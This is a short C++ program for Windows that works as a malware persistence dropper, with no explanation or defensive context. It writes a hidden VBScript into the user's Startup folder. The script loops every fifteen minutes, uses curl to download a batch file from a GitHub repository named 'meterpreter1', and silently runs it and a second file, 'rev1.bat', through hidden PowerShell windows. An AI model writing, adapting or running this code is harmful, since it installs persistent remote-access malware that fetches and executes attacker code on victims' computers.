#include <iostream>
#include <fstream>
#include <string>
#include <windows.h>
#include <shlobj.h> 

int main() {
    char startupFolderPath[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startupFolderPath) != S_OK) {
        std::cerr << "Error: Could not retrieve Startup folder path" << std::endl;
        return 1;
    }
    std::string filePath = std::string(startupFolderPath) + "\\start.vbs";
    const std::string vbscriptContent =
        "Do\n"
        "     Set objShell = CreateObject(\"WScript.Shell\")\n"
        "     objShell.Run \"cmd /c curl https://raw.githubusercontent.com/0x2034/meterpreter1/main/nihbtdtdow1.bat -o %temp%\\nihbtdtdow1.bat\", 0, True\n"
        "     objShell.Run \"powershell -WindowStyle Hidden -Command Start-Process -FilePath '%temp%\\nihbtdtdow1.bat' -WindowStyle Hidden\", 0, True\n"
        "     objShell.Run \"powershell -c Start-Process -FilePath '%temp%\\rev1.bat' -WindowStyle Hidden\", 0, True\n"
        "     WScript.Sleep 900000\n"
        "Loop";
    std::ofstream outFile(filePath);
    if (!outFile) {
        std::cerr << "Error: Could not create file " << filePath << std::endl;
        return 1;
    }
    outFile << vbscriptContent;
    outFile.close();
    std::cout << "VBScript file created successfully at " << filePath << std::endl;
    return 0;
}
